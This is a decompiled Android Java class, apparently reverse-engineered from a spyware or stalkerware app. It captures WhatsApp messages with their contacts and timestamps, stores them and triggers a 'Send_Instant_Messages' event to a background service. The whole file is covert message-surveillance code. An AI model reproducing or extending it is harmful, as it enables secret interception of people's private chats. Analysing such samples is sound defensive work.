package com.security.WA;

import android.content.Intent;
import com.android.system.CoreApp;
import com.app.system.common.h.i;
import com.app.system.common.service.EventsAndReceiveService;
import com.security.ServiceSettings;
import java.util.ArrayList;
import java.util.Iterator;

public class a
{
  private static a c;
  ArrayList<WaObject> a = new ArrayList();
  i b = new i(CoreApp.a());
  
  public static a a()
  {
    if (c == null) {
      c = new a();
    }
    return c;
  }
  
  private boolean b(WaObject paramWaObject)
  {
    Iterator localIterator = this.a.iterator();
    while (localIterator.hasNext())
    {
      WaObject localWaObject = (WaObject)localIterator.next();
      if ((localWaObject.Time.equals(paramWaObject.Time)) && (localWaObject.Message.equals(paramWaObject.Message)) && (localWaObject.Contact.equals(paramWaObject.Contact)) && (localWaObject.Incoming == paramWaObject.Incoming)) {
        return true;
      }
    }
    return false;
  }
  
  public void a(WaObject paramWaObject)
  {
    if ((ServiceSettings.a().whatsappRtActive) && (!b(paramWaObject)))
    {
      this.a.add(paramWaObject);
      this.b.a(paramWaObject);
      paramWaObject = new Intent(CoreApp.a(), EventsAndReceiveService.class);
      paramWaObject.putExtra("event_core_app", "Send_Instant_Messages");
      com.b.a.a.a.a(CoreApp.a(), paramWaObject);
    }
  }
}


/* Location:              ~/com/security/WA/a.class
 *
 * Reversed by:           J
 */